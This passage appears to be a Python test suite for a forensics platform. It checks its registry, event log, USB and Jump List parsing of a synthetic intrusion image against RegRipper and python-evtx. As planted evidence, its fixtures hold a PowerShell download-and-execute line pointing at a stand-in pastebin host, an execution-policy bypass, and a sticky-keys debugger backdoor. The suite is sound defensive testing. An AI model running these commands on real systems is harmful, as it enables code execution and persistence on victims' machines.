    svc = {p['name']: p for p in pers if p['kind'] == 'Service'}
    rr_svc = {row[1]: row for row in csv_rows(_rr('/Windows/System32/config/SYSTEM', 'svc')) if len(row) > 6 and row[5] in ('Auto Start', 'Boot Start', 'System Start')}
    check('auto-start services equal RegRipper; the one running from a user profile is flagged, the spooler is not',
          set(svc) == set(rr_svc) and svc['SecureDeleteSvc']['command'] == rr_svc['SecureDeleteSvc'][3] and svc['SecureDeleteSvc']['flags']
          and not svc['Spooler']['flags'] and svc['Spooler']['start_type'] == 'Automatic', ({k: (v['command'], v['flags']) for k, v in svc.items()}, rr_svc))
    rr_run = _rr('/Windows/System32/config/SOFTWARE', 'run')
    machine = {(p['kind'], p['name']): p for p in pers if p['scope'] == 'computer' and p['kind'] != 'Service'}
    check('computer Run and RunOnce entries equal RegRipper; the encoded PowerShell RunOnce is flagged',
          'SecurityHealth - %windir%\\system32\\SecurityHealthSystray.exe' in rr_run and 'Cleanup - powershell.exe -NoProfile -EncodedCommand' in rr_run
          and machine.get(('RunOnce', 'Cleanup'), {}).get('flags') and not machine.get(('Run', 'SecurityHealth'), {}).get('flags'), machine)
    ifeo = machine.get(('IFEO debugger', 'sethc.exe'), {})
    check('the sticky-keys debugger (Image File Execution Options) is found and flagged, as RegRipper shows',
          ifeo.get('command') == 'C:\\Windows\\System32\\cmd.exe' and ifeo.get('flags') and 'cmd.exe' in _rr('/Windows/System32/config/SOFTWARE', 'imagefile'), ifeo)
    inst = {p['name'] for p in rows('INSTALLED_PROGRAM')}
    rr_inst = set(re.findall(r'^\s+(\S.*?) v\.\S+$', _rr('/Windows/System32/config/SOFTWARE', 'uninstall'), re.M))
    check('installed programs equal RegRipper', inst == rr_inst == {'SecureDelete 1.4', '7-Zip 23.01 (x64)'}, (inst, rr_inst))

    # Execution evidence, the timeline and the rest.
    exe = {r['program']: r for r in get(f'/api/forensics/execution?case_id={A}', inv).json['data']}
    sd = exe.get('SecureDelete.exe', {})
    check('execution evidence merges every trace of SecureDelete.exe: Prefetch, UserAssist, BAM, Amcache and ShimCache',
          sd.get('sources') == ['prefetch', 'userassist', 'bam', 'amcache', 'shimcache'] and sd.get('sha1') == SECUREDELETE_SHA1
          and iso(sd.get('last_run')) == utc(2026, 9, 1, 14, 18, 31) and iso(sd.get('first_seen')) == utc(2026, 9, 1, 10, 6, 2), sd)
    np_ = exe.get('notepad.exe', {})
    check('notepad.exe: UserAssist, BAM and ShimCache, no Prefetch or Amcache; every row with a trace of running is marked as run',
          np_.get('sources') == ['userassist', 'bam', 'shimcache'] and np_.get('ran') is True
          and get(f'/api/forensics/execution?case_id={A}&ran=false', inv).json['total'] == 0, np_)
    tl = {(e['type'], e['description']) for e in get(f'/api/forensics/timeline?case_id={A}&limit=1000', inv).json['data']}
    expected = [('EXPLORER_SEARCH', 'Explorer search (alice): "payroll"'), ('FOLDER_BROWSED', 'Folder browsed (ShellBags, alice): E:\\Exports'),
                ('PROGRAM_RUN_BAM', 'Program run (BAM): \\Users\\alice\\Downloads\\SecureDelete.exe'),
                ('RUN_DIALOG', 'Run dialog command (alice): powershell -ExecutionPolicy Bypass -File C:\\Users\\alice\\Downloads\\cleanup.ps1')]
    check('the timeline gains the user activity (search, folder, program runs, Run dialog)', all(x in tl for x in expected),
          [x for x in expected if x not in tl])
    s = get(f'/api/forensics/search?case_id={A}&q=payroll', inv).json
    check('keyword search finds registry activity ("payroll" search, recent document)', (s['totals'].get('registry') or 0) >= 2, s['totals'])
    check('an unknown type is refused (400); another investigator gets 404',
          get(f'/api/forensics/registry?case_id={A}&type=NOPE', inv).status == 400 and get(f'/api/forensics/registry?case_id={A}&type=USERASSIST', C['INV2']).status == 404
          and get(f'/api/forensics/execution?case_id={A}', C['INV2']).status == 404)
    t = post('/api/tags', inv, {'case_id': A, 'item_type': 'REGISTRY', 'item_id': ww[0]['_id'], 'label': 'NOTABLE', 'note': 'searched for payroll'})
    j = _analyse(inv, E, {'modules': ['registry']})
    check('a registry record can be tagged and the tag follows it when the registry is read again',
          t.status == 200 and j['result']['summary'].get('tags') == {'relinked': 1, 'unresolved': 0}, (t, j.get('result', {}).get('summary', {}).get('tags')))
    req('DELETE', f"/api/tags/{t.json['tag_id']}", inv)
    ov = get(f'/api/cases/{A}/overview', inv).json['counts']
    check('the overview counts executed programs, folders, searches, persistence (flagged) and installed programs',
          ov.get('folders_browsed') == 3 and ov.get('persistence_flagged') == 4 and ov.get('installed_programs') == 2 and ov.get('user_searches') == 6, ov)

    # Real hives (Plaso test data), against RegRipper.
    sys.path.insert(0, '/app')
    from app.forensic import user_registry as ur
    nt = sample('plaso', 'NTUSER.DAT')
    if nt:
        ours = {(r['raw_name'], r['run_count']) for r in ur.userassist(nt, None)}
        rr_text = _rr(nt, 'userassist')
        rr_set = {(m[0], int(m[1])) for m in re.findall(r'^\s+(\S.*)\s\((\d+)\)$', rr_text, re.M)}
        check(f'real Windows XP NTUSER.DAT: UserAssist entries equal RegRipper ({len(rr_set)} entries)', ours and ours == rr_set,
              (sorted(ours - rr_set)[:5], sorted(rr_set - ours)[:5]))
    sysh = sample('plaso', 'SYSTEM')
    if sysh:
        ours = [r['path'] for r in ur.shimcache(sysh)]
        rr_paths = re.findall(r'^(\S.*?)\s{2}\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}', _rr(sysh, 'appcompatcache'), re.M)
        check(f'real Windows 7 SYSTEM: ShimCache paths equal RegRipper ({len(rr_paths)} entries)', ours and sorted(ours) == sorted(rr_paths),
              (len(ours), len(rr_paths)))
    soft = sample('plaso', 'SOFTWARE')
    if soft:
        ours = {r['name'] for r in ur.installed_programs(soft)}
        rr_names = set(re.findall(r'^\s+(\S.*?)(?: v\.\S+)?$', _rr(soft, 'uninstall').split('Uninstall', 2)[-1], re.M))
        check(f'real SOFTWARE: installed programs equal RegRipper ({len(ours)} programs)', ours and ours <= rr_names, sorted(ours - rr_names)[:5])


def csv_rows(text):
    import csv
    import io
    return list(csv.reader(io.StringIO(text)))


LOGS_DIR = '/Windows/System32/winevt/Logs'
EVTX_LOGS = {  # log file -> (channel, records written by make_artifacts.py)
    'Security.evtx': ('Security', 9), 'System.evtx': ('System', 7),
    'Microsoft-Windows-PowerShell%4Operational.evtx': ('Microsoft-Windows-PowerShell/Operational', 1),
    'Windows PowerShell.evtx': ('Windows PowerShell', 2),
    'Microsoft-Windows-Partition%4Diagnostic.evtx': ('Microsoft-Windows-Partition/Diagnostic', 2),
}
PS_SCRIPT = 'IEX (New-Object Net.WebClient).DownloadString("https://pastebin.example.com/raw/x9f2")'  # make_artifacts.py
EXPECTED_DETECTIONS = {  # rule title -> (event ID, time) of the one record it must match
    'Service installed from a user or temporary folder, or running a script': (7045, utc(2026, 9, 1, 10, 7, 30)),
    'PowerShell started with an encoded command': (400, utc(2026, 9, 1, 14, 24, 30)),
    'PowerShell downloads and runs code': (4104, utc(2026, 9, 1, 14, 24, 31)),
    'Security event log cleared': (1102, utc(2026, 9, 1, 14, 25)),
    'Local user account created': (4720, utc(2026, 9, 1, 15, 10, 5)),
    'Account added to the Administrators group': (4732, utc(2026, 9, 1, 15, 10, 20)),
    'Local user account deleted': (4726, utc(2026, 9, 1, 18, 30)),
}


def _evtx_truth(data: bytes):
    """python-evtx, an independent EVTX reader, on a log's bytes: {record number: fields}."""
    import defusedxml.ElementTree as ET
    from Evtx.Evtx import Evtx
    tag = lambda e: e.tag.rsplit('}', 1)[-1]
    p = Path(tempfile.mkdtemp()) / 'log.evtx'
    p.write_bytes(data)
    out = {}
    with Evtx(str(p)) as log:
        for r in log.records():
            raw = r.xml()
            root = ET.fromstring(raw)
            rec = {'record_id': r.record_num(), 'data': {}, 'values': [], 'user_data': None, 'arrays': '&lt;string&gt;' in raw}
            for part in root:
                if tag(part) == 'System':
                    for el in part:
                        t = tag(el)
                        if t == 'EventID':
                            rec['event_id'] = int(el.text)
                        elif t == 'TimeCreated':
                            rec['time'] = iso(el.get('SystemTime'))
                        elif t == 'Provider':
                            rec['provider'] = el.get('Name')
                        elif t in ('Channel', 'Computer'):
                            rec[t.lower()] = el.text
                        elif t == 'Security':
                            rec['user_sid'] = el.get('UserID') or None
                elif tag(part) == 'EventData':
                    for d in part:
                        if tag(d) == 'Binary':
                            rec['data']['Binary'] = d.text or ''
                        elif d.get('Name') is not None:
                            rec['data'][d.get('Name')] = d.text or ''
                        else:
                            rec['values'].append(d.text or '')
                elif tag(part) == 'UserData' and len(part):
                    rec['user_data'] = tag(part[0])
                    rec['data'].update({tag(c): (c.text or '').strip() for c in part[0] if not len(c)})
            out[rec['record_id']] = rec
    return out


_EVTX_TIME = re.compile(r'(\d{4}-\d\d-\d\d)[T ](\d\d:\d\d:\d\d)(?:\.(\d+))?(?:Z|\+00:00)?$')


def _evtx_same(ours, theirs):
    """One data value as libevtx (ours) and python-evtx print it: FILETIMEs as text with nanoseconds or through floating
    point, binary as hex or Base64, GUIDs and booleans in another case, control characters kept or dropped."""
    a = re.sub(r'[\x00-\x1f]', '', '' if ours is None else str(ours)).strip()
    b = re.sub(r'[\x00-\x1f]', '', '' if theirs is None else str(theirs)).strip()
    if a.casefold() == b.casefold():
        return True
    ta, tb = _EVTX_TIME.match(a), _EVTX_TIME.match(b)
    if ta and tb:
        t = lambda m: datetime.fromisoformat(f'{m.group(1)}T{m.group(2)}.{(m.group(3) or "0")[:6].ljust(6, "0")}')
        return abs(t(ta) - t(tb)) <= timedelta(microseconds=2)
    if a and b and re.fullmatch(r'[0-9A-Fa-f]+', a):
        try:
            return base64.b64decode(b, validate=True).hex().casefold() == a.casefold()
        except Exception:
            return False
    return False


def _evtx_equal(ours: dict, theirs: dict) -> bool:
    """A record's data as both readers give it. python-evtx prints a NULL value as an empty element where libevtx (and
    Windows) leaves it out, and prints string arrays as markup; empty values are ignored and arrays compared by content."""
    blank = lambda v: v is None or not re.sub(r'[\x00-\x1f]', '', str(v)).strip()  # python-evtx drops control characters
    od = {k: v for k, v in (ours.get('data') or {}).items() if not blank(v)}
    td = {k: v for k, v in theirs['data'].items() if not blank(v)}
    if set(od) != set(td) or not all(_evtx_same(od[k], td[k]) for k in od):
        return False
    ov = [v for v in ours.get('data_values') or [] if not blank(v)]
    tv = [v for v in theirs['values'] if not blank(v)]
    if theirs['arrays']:
        joined = ' '.join(tv)
        return all(re.sub(r'[\x00-\x1f]', '', v) in joined for v in ov)
    return len(ov) == len(tv) and all(_evtx_same(a, b) for a, b in zip(ov, tv))


@section('12h Windows event logs (vs python-evtx on the logs in the image, and the generator)')
def t_eventlogs():
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    mods = get(f'/api/evidence/{E}', inv).json['modules']
    check('the event log module ran with the standard analysis', (mods.get('eventlogs') or {}).get('status') == 'COMPLETED', mods.get('eventlogs'))
    logs = {x['name']: x for x in get(f'/api/forensics/eventlogs/logs?case_id={A}&evidence_id={E}', inv).json['data']}
    events = get(f'/api/forensics/eventlogs/events?case_id={A}&evidence_id={E}&limit=1000', inv).json['data']
    by_log = {}
    for e in events:
        by_log.setdefault(e['log'], {})[e['record_id']] = e

    # Every log, record for record, against python-evtx reading the same bytes out of the image.
    truth = {name: _evtx_truth(icat_bytes(f'{LOGS_DIR}/{name}')) for name in EVTX_LOGS}
    check('every log is found with its SHA-256 (as icat reads it), channel, record count and time span',
          set(logs) == set(EVTX_LOGS) and all(
              logs[n]['sha256'] == hashlib.sha256(icat_bytes(f'{LOGS_DIR}/{n}')).hexdigest() and logs[n]['channel'] == ch
              and logs[n]['records'] == len(truth[n]) == count and logs[n]['recovered'] == 0
              and iso(logs[n]['first']) == min(r['time'] for r in truth[n].values()) and iso(logs[n]['last']) == max(r['time'] for r in truth[n].values())
              for n, (ch, count) in EVTX_LOGS.items()),
          {n: (x.get('channel'), x.get('records'), x.get('first'), x.get('last')) for n, x in logs.items()})
    mismatch = []
    for name, recs in truth.items():
        for num, t in recs.items():
            o = by_log.get(name, {}).get(num)
            if not o or (o['event_id'], o['provider'], o['channel'], o['computer'], o.get('user_sid')) != \
                    (t['event_id'], t['provider'], t['channel'], t['computer'], t.get('user_sid')) \
                    or abs(iso(o['time']) - t['time']) > timedelta(microseconds=1) or not _evtx_equal(o, t) or o.get('user_data') != t['user_data']:
                mismatch.append((name, num, o and {k: o.get(k) for k in ('event_id', 'time', 'data', 'data_values')}, t))
    check(f'all {sum(len(r) for r in truth.values())} records equal python-evtx: record number, event ID, provider, channel, computer, '
          'user SID, time, EventData (named and unnamed) and UserData', not mismatch and len(events) == sum(len(r) for r in truth.values()), mismatch[:3])

    # What the events mean, against the generator's story.
    ev = {(e['event_id'], e['time']): e for e in events}
    at = lambda eid, *t: ev.get((eid, utc(2026, 9, 1, *t).isoformat()), {})
    expected = {
        (1102, 14, 25, 0): ('Security log cleared by LAPTOP-07\\alice', 'alice', 'LOG_CLEARED'),
        (4624, 14, 30, 12): ('LAPTOP-07\\alice logged on (Unlock, type 7) (workstation LAPTOP-07)', 'alice', 'LOGON'),
        (4625, 15, 2, 10): ('Failed logon for LAPTOP-07\\administrator (Network, type 3) from 192.168.1.66 (workstation KALI): wrong password',
                            'administrator', 'LOGON_FAILED'),
        (4720, 15, 10, 5): ('User account created: LAPTOP-07\\backup_admin by LAPTOP-07\\alice', 'backup_admin', 'ACCOUNT'),
        (4732, 15, 10, 20): ('backup_admin added to group Builtin\\Administrators by LAPTOP-07\\alice', 'backup_admin', 'ACCOUNT'),
        (4726, 18, 30, 0): ('User account deleted: LAPTOP-07\\backup_admin by LAPTOP-07\\alice', 'backup_admin', 'ACCOUNT'),
        (4647, 18, 41, 30): ('LAPTOP-07\\alice logged off (user initiated)', 'alice', 'LOGON'),
        (7001, 8, 52, 10): ('alice logged on (Winlogon)', 'alice', 'LOGON'),
        (7002, 12, 31, 4): ('alice logged off (Winlogon)', 'alice', 'LOGON'),
        (7045, 10, 7, 30): ('Service installed: Secure Delete Helper: C:\\Users\\alice\\AppData\\Roaming\\sdsvc.exe (auto start, runs as LocalSystem)',
                            'alice', 'SERVICE'),
        (1006, 14, 12, 44): ('Disk connected: SanDisk Cruzer Blade, 15.9 GB (serial 4C530001230518109141)', None, 'DEVICE'),
        (1006, 14, 41, 10): ('Disk removed: SanDisk Cruzer Blade (serial 4C530001230518109141)', None, 'DEVICE'),
        (6006, 18, 42, 5): ('Event log service stopped (clean shutdown)', None, 'POWER'),
    }
    got = {k: (at(k[0], *k[1:]).get('description'), at(k[0], *k[1:]).get('user'), at(k[0], *k[1:]).get('category')) for k in expected}
    check('catalogued events are described in plain English with their user and category (backup_admin is named from the event '
          'that created it: the account is gone from the SAM)', got == expected, {k: v for k, v in got.items() if v != expected[k]})
    ps = at(400, 14, 24, 30)
    check('the encoded PowerShell command is decoded, and equals the script block PowerShell logged one second later',
          (ps.get('details') or {}).get('DecodedCommand') == PS_SCRIPT == at(4104, 14, 24, 31).get('data', {}).get('ScriptBlockText')
          and PS_SCRIPT in ps.get('description', ''), ps.get('details'))
    svc = next((p for p in get(f'/api/forensics/registry?case_id={A}&type=PERSISTENCE', inv).json['data'] if p['name'] == 'SecureDeleteSvc'), {})
    check('the installed service (System 7045) is the SecureDeleteSvc service in the SYSTEM hive: same program, installed when the key was written',
          at(7045, 10, 7, 30).get('data', {}).get('ImagePath') == svc.get('command') and iso(svc.get('key_last_write')) == utc(2026, 9, 1, 10, 7, 30), svc)
    notable = get(f'/api/forensics/eventlogs/events?case_id={A}&evidence_id={E}&notable=true&limit=1000', inv).json
    check('20 of the 21 records are notable (the PowerShell "engine stopped" event is not)',
          notable['total'] == 20 and len(events) == 21 and [e['event_id'] for e in events if not e['notable']] == [403], [e['event_id'] for e in events if not e['notable']])

    # Detections.
    dets = get(f'/api/forensics/eventlogs/detections?case_id={A}&evidence_id={E}', inv).json['data']
    by_title = {d['title']: d for d in dets}
    rec_of = {e['nk']: e for e in events}
    check('the curated rules detect exactly the planted activity, each on its one event',
          set(by_title) == set(EXPECTED_DETECTIONS) and all(
              by_title[t]['count'] == 1 and len(by_title[t]['record_nks']) == 1 and (rec_of[by_title[t]['record_nks'][0]]['event_id'],
                                                                                     iso(rec_of[by_title[t]['record_nks'][0]]['time'])) == want
              for t, want in EXPECTED_DETECTIONS.items()),
          sorted((d['title'], d['count']) for d in dets))
    check('three failed logons from 192.168.1.66 stay below the password-guessing threshold (more than 10 in 10 minutes): no detection',
          not any('password' in d['title'].lower() for d in dets) and sum(1 for e in events if e['event_id'] == 4625) == 3, [d['title'] for d in dets])
    check('detections are ordered most severe first, and the matched records carry the rule',
          [d['level'] for d in dets] == sorted([d['level'] for d in dets], key=['critical', 'high', 'medium', 'low', 'informational'].index)
          and all(by_title[t]['rule_id'] in rec_of[by_title[t]['record_nks'][0]]['detections'] for t in by_title), [d['level'] for d in dets])
    flt = get(f"/api/forensics/eventlogs/events?case_id={A}&detection={by_title['Security event log cleared']['rule_id']}", inv).json
    check('events can be listed by the detection that matched them', [e['event_id'] for e in flt['data']] == [1102], flt.get('total'))

    # USB: the SanDisk drive gains its connect and remove times from Partition/Diagnostic 1006.
    usb = [d for d in get(f'/api/forensics/usb?case_id={A}', inv).json['data'] if d['evidence_id'] == E]
    sandisk = next((d for d in usb if d.get('serial') == '4C530001230518109141'), {})
    check('the SanDisk drive (known from setupapi.dev.log) gains connected 14:12:44 and removed 14:41:10 from the event log; no device is added',
          iso(sandisk.get('eventlog_first_connected')) == utc(2026, 9, 1, 14, 12, 44) == iso(sandisk.get('eventlog_last_connected'))
          and iso(sandisk.get('eventlog_last_removed')) == utc(2026, 9, 1, 14, 41, 10) and sandisk.get('setupapi_first_install')
          and [x['action'] for x in sandisk.get('eventlog_events') or []] == ['connected', 'removed']
          and not any(d.get('source') == 'EVENT_LOG' for d in usb), sandisk)
    tl = get(f'/api/forensics/timeline?case_id={A}&type=USB_ACTIVITY&limit=500', inv).json['data']
    from_logs = [e for e in tl if e.get('source') == 'EVENT_LOG' and e.get('evidence_id') == E]
    check('the timeline gains the two USB events from the event log, with the serial number',
          sorted((e['usb_event'], iso(e['timestamp'])) for e in from_logs) == [('EVENTLOG_CONNECTED', utc(2026, 9, 1, 14, 12, 44)),
                                                                            ('EVENTLOG_REMOVED', utc(2026, 9, 1, 14, 41, 10))]
          and all(e['serial'] == '4C530001230518109141' for e in from_logs), from_logs)

    # Timeline, dashboard and filters.
    kinds = {}
    for e in get(f'/api/forensics/timeline?case_id={A}&limit=2000', inv).json['data']:
        if e.get('source') == 'EVENT_LOG' and e.get('evidence_id') == E:
            kinds.setdefault(e['type'], []).append(iso(e['timestamp']))
    check('notable events are on the timeline: logons (8:52, 13:28, 14:30), logoffs, the cleared log, the service and PowerShell',
          sorted(kinds.get('LOGON', [])) == [utc(2026, 9, 1, 8, 52, 10), utc(2026, 9, 1, 13, 28, 41), utc(2026, 9, 1, 14, 30, 12)]
          and sorted(kinds.get('LOGOFF', [])) == [utc(2026, 9, 1, 12, 31, 4), utc(2026, 9, 1, 18, 41, 30)]
          and kinds.get('LOG_CLEARED') == [utc(2026, 9, 1, 14, 25)] and kinds.get('SERVICE_INSTALLED') == [utc(2026, 9, 1, 10, 7, 30)]
          and len(kinds.get('POWERSHELL', [])) == 2 and len(kinds.get('LOGON_FAILED', [])) == 3 and len(kinds.get('ACCOUNT_CHANGED', [])) == 3, kinds)
    dash = get(f'/api/cases/{A}/dashboard?tz=UTC&evidence_id={E}', inv).json
    day = next((d for d in dash['per_day'] if d['date'] == '2026-09-01'), {})
    check('the activity dashboard counts the 5 logons and logoffs of 1 September', (day.get('by_group') or {}).get('logon') == 5, day)
    q = lambda extra: get(f'/api/forensics/eventlogs/events?case_id={A}&evidence_id={E}{extra}', inv)
    check('filters: event IDs, category, search, level, user and time window',
          q('&event_id=4625').json['total'] == 3 and q('&event_id=4624,4647').json['total'] == 2 and q('&category=ACCOUNT').json['total'] == 3
          and q('&search=backup_admin').json['total'] == 3 and [e['event_id'] for e in q('&level=warning').json['data']] == [4104]
          and q('&user=ALICE').json['total'] >= 8 and q('&start=2026-09-01T15:00:00Z&end=2026-09-01T15:11:00Z').json['total'] == 5,
          [q(x).json.get('total') for x in ('&event_id=4625', '&category=ACCOUNT', '&search=backup_admin', '&user=ALICE')])
    check('bad filters are refused (400)', q('&event_id=x').status == 400 and q('&category=NOPE').status == 400 and q('&level=loud').status == 400
          and q('&start=yesterday').status == 400)
    detail = get(f"/api/forensics/eventlogs/events/{at(1102, 14, 25, 0)['_id']}?case_id={A}", inv).json
    check('one event with its XML: the 1102 record as libevtx rendered it (UserData names who cleared the log)',
          '<EventID>1102</EventID>' in detail.get('xml', '') and '<SubjectUserName>alice</SubjectUserName>' in detail['xml']
          and detail.get('user_data') == 'LogFileCleared', detail.get('xml', '')[:200])
    facets = get(f'/api/forensics/eventlogs/facets?case_id={A}&evidence_id={E}', inv).json
    check('the filter lists hold every channel and category with counts',
          {c['value']: c['count'] for c in facets['channels']} == {ch: n for ch, n in EVTX_LOGS.values()}
          and {c['value'] for c in facets['categories']} >= {'LOGON', 'LOGON_FAILED', 'ACCOUNT', 'LOG_CLEARED', 'SERVICE', 'POWERSHELL', 'DEVICE', 'POWER'},
          facets)
    s = get(f'/api/forensics/search?case_id={A}&q=backup_admin', inv).json
    check('keyword search finds event records', (s['totals'].get('eventlogs') or 0) == 3 and 'xml' not in (s['results']['eventlogs'] or [{}])[0], s['totals'])
    ov = get(f'/api/cases/{A}/overview', inv).json['counts']
    case_wide = (get(f'/api/forensics/eventlogs/events?case_id={A}&limit=1', inv).json['total'],
                 get(f'/api/forensics/eventlogs/events?case_id={A}&notable=true&limit=1', inv).json['total'],
                 len(get(f'/api/forensics/eventlogs/detections?case_id={A}', inv).json['data']))
    check('the overview counts event records, notable events and detections (the job summary of this image: 21, 20, 7)',
          (ov.get('event_records'), ov.get('notable_events'), ov.get('event_detections')) == case_wide
          and {k: C['COUNTS'].get(k) for k in ('event_records', 'notable_events', 'eventlog_detections')} == {'event_records': 21, 'notable_events': 20, 'eventlog_detections': 7},
          (ov, case_wide, C['COUNTS']))
    check('another investigator gets 404 for logs, events, one event and detections',
          all(get(p, C['INV2']).status == 404 for p in (f'/api/forensics/eventlogs/logs?case_id={A}', f'/api/forensics/eventlogs/events?case_id={A}',
                                                         f"/api/forensics/eventlogs/events/{detail['_id']}?case_id={A}",
                                                         f'/api/forensics/eventlogs/detections?case_id={A}', f'/api/forensics/eventlogs/facets?case_id={A}')))

    # Tags follow an event record through a re-run; a re-run does not duplicate anything.
    t = post('/api/tags', inv, {'case_id': A, 'item_type': 'EVENT', 'item_id': detail['_id'], 'label': 'EVIDENCE', 'note': 'log cleared'})
    j = _analyse(inv, E, {'modules': ['eventlogs']})
    check('an event record can be tagged, and the tag follows it when the logs are read again',
          t.status == 200 and j['status'] == 'COMPLETED' and j['result']['summary'].get('tags') == {'relinked': 1, 'unresolved': 0},
          (t, j.get('result', {}).get('summary', {}).get('tags')))
    req('DELETE', f"/api/tags/{t.json['tag_id']}", inv)
    again = get(f'/api/forensics/eventlogs/events?case_id={A}&evidence_id={E}&limit=1000', inv).json
    tl2 = [e for e in get(f'/api/forensics/timeline?case_id={A}&type=USB_ACTIVITY&limit=500', inv).json['data'] if e.get('source') == 'EVENT_LOG' and e.get('evidence_id') == E]
    sandisk2 = next((d for d in get(f'/api/forensics/usb?case_id={A}', inv).json['data'] if d['evidence_id'] == E and d.get('serial') == '4C530001230518109141'), {})
    check('reading the logs again replaces their records, detections and USB times without duplicates',
          again['total'] == 21 and len(tl2) == 2 and len(sandisk2.get('eventlog_events') or []) == 2
          and len(get(f'/api/forensics/eventlogs/detections?case_id={A}&evidence_id={E}', inv).json['data']) == 7, (again['total'], len(tl2)))

    # Real logs: python-evtx's own sample files, read by DFIP's parser and by python-evtx.
    sys.path.insert(0, '/app')
    from app.forensic.eventlogs import EvtxLog
    for name in ('security.evtx', 'system.evtx'):
        path = sample('python-evtx', name)
        if not path:
            continue
        log = EvtxLog(path, 10 ** 6)
        ours = {r['record_id']: r for r in log.records()}
        theirs = _evtx_truth(path.read_bytes())
        bad = [n for n, t in theirs.items() if n not in ours or (ours[n]['event_id'], ours[n]['provider'], ours[n]['channel'], ours[n]['computer'])
               != (t['event_id'], t['provider'], t['channel'], t['computer']) or abs(ours[n]['time'] - t['time']) > timedelta(microseconds=2)
               or not _evtx_equal(ours[n], t)]
        arrays = sum(1 for t in theirs.values() if t['arrays'])
        check(f'real {name} ({len(theirs)} records): every record equals python-evtx (event ID, provider, channel, computer, time, data; '
              f'{arrays} records with string arrays compared by content)', len(ours) == len(theirs) and not bad and not any(r.get('parse_error') for r in ours.values()),
              (len(ours), len(theirs), bad[:5]))
        if log.stats['unreadable']:
            note(f'real {name}: recovered records libevtx could not read', f'{log.stats["unreadable"]} ({log.stats["errors"][0][:160]})')


JUMP = '/Users/alice/AppData/Roaming/Microsoft/Windows/Recent'
ACTIVITIES_DB = '/Users/alice/AppData/Local/ConnectedDevicesPlatform/L.alice/ActivitiesCache.db'
THUMBCACHE = '/Users/alice/AppData/Local/Microsoft/Windows/Explorer/thumbcache_256.db'
NOTEPAD_JL = f'{JUMP}/AutomaticDestinations/9b9cdc69c1c24e2b.automaticDestinations-ms'
EXPLORER_JL = f'{JUMP}/AutomaticDestinations/f01b4d95cf55d32a.automaticDestinations-ms'
CHROME_JL = f'{JUMP}/CustomDestinations/5d696d521de238c3.customDestinations-ms'
SAMPLES_IMG = Path('/testdata/dfip-samples-disk.dd')


def _pngs(data: bytes) -> list[bytes]:
    """Every PNG in a byte string, cut at its IEND chunk (an independent way to find the thumbnails)."""
    out, pos = [], data.find(b'\x89PNG\r\n\x1a\n')
    while pos != -1:
        end = data.find(b'IEND', pos)
        out.append(data[pos:end + 8])
        pos = data.find(b'\x89PNG\r\n\x1a\n', end)
    return out


@section('12i Jump lists, Timeline and thumbnails (vs pyolecf, sqlite3 and Pillow on the files in the image, and the generator)')
def t_user_activity():
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    mods = get(f'/api/evidence/{E}', inv).json['modules']
    check('the user activity module ran with the standard analysis', (mods.get('user_activity') or {}).get('status') == 'COMPLETED',
          mods.get('user_activity'))
    rows = lambda t, extra='': get(f'/api/forensics/user-activity?case_id={A}&evidence_id={E}&type={t}&limit=2000{extra}', inv).json
    jls = rows('JUMPLIST_ENTRY')['data']
    by_file = {}
    for j in jls:
        by_file.setdefault(j['source_path'], []).append(j)

    # Jump Lists, against pyolecf (libyal's compound-file reader) and the generator.
    import pyolecf
    local = Path(tempfile.mkdtemp()) / 'notepad.automaticDestinations-ms'
    local.write_bytes(icat_bytes(NOTEPAD_JL))
    olecf = pyolecf.file()
    olecf.open(str(local))
    streams = sorted(olecf.root_item.get_sub_item(i).name for i in range(olecf.root_item.number_of_sub_items))
    olecf.close()
    notepad = sorted(by_file.get(NOTEPAD_JL, []), key=lambda j: j['entry_number'])
    check("Notepad's Jump List: one shell link stream per DestList entry (pyolecf lists the same streams)",
          streams == ['1', '2', '3', 'DestList'] and [format(j['entry_number'], 'x') for j in notepad] == ['1', '2', '3'], (streams, notepad))
    got = [(j['target'], iso(j['last_used']), j['pinned'], j['access_count']) for j in reversed(notepad)]
    check('Notepad: the payroll export on E: at 14:14:06, cleanup.ps1 pinned (used twice), the project notes',
          got == [('E:\\payroll-export.csv', utc(2026, 9, 1, 14, 14, 6), False, 1), ('C:\\Users\\alice\\Downloads\\cleanup.ps1', utc(2026, 9, 1, 10, 6, 45), True, 2),
                  ('C:\\Users\\alice\\Documents\\project-notes.txt', utc(2026, 8, 28, 16, 5), False, 3)]
          and all(j['application'] == 'Notepad (64-bit)' and j['user'] == 'alice' and j['hostname'] == 'laptop-07'
                  and j['mac_address'] == '00:15:5d:01:a2:b3' for j in notepad), got)
    pay = next((j for j in notepad if j['target'] == 'E:\\payroll-export.csv'), {})
    recent = [r for r in get(f'/api/forensics/activity?case_id={A}&kind=RECENT_FILE', inv).json['data'] if r['target_path'] == 'E:\\payroll-export.csv']
    check("the export's link in the Jump List is on the removable drive CRUZER (serial 6A3C-91F2), opened when the Recent shortcut says",
          (pay.get('lnk') or {}).get('drive_type') == 'Removable' and pay['lnk'].get('volume_label') == 'CRUZER'
          and pay['lnk'].get('drive_serial') == '6A3C-91F2' and recent and iso(recent[0]['lnk_modified']) == iso(pay['last_used']), (pay.get('lnk'), recent[:1]))
    explorer = sorted(by_file.get(EXPLORER_JL, []), key=lambda j: j['entry_number'], reverse=True)
    shell = next((b for b in get(f'/api/forensics/registry?case_id={A}&type=SHELLBAG', inv).json['data'] if b['path'] == 'E:\\Exports'), {})
    check("Explorer's Jump List: E:\\Exports at 14:13:02, the time the ShellBags give for it, then Documents",
          [(j['target'], iso(j['last_used'])) for j in explorer] == [('E:\\Exports', utc(2026, 9, 1, 14, 13, 2)), ('C:\\Users\\alice\\Documents', utc(2026, 9, 1, 14, 10, 12))]
          and iso(shell.get('key_last_write')) == utc(2026, 9, 1, 14, 13, 2) and explorer[0]['application'] == 'Windows Explorer', (explorer, shell))
    chrome = by_file.get(CHROME_JL, [])
    check("Chrome's custom Jump List: the closed upload page, and two tasks (no times: the program writes these lists)",
          [(j['category'], (j['lnk'] or {}).get('arguments'), (j['lnk'] or {}).get('description'), j.get('last_used')) for j in chrome] == [
              ('Recently closed', '--profile-directory=Default https://filetransfer.example.net/upload', 'Anonymous File Upload', None),
              ('Tasks', '--new-window', 'New window', None), ('Tasks', '--incognito', 'New Incognito window', None)], chrome)

    # The Windows Timeline, against the database read with sqlite3.
    db_path = Path(tempfile.mkdtemp()) / 'ActivitiesCache.db'
    db_path.write_bytes(icat_bytes(ACTIVITIES_DB))
    con = sqlite3.connect(db_path)
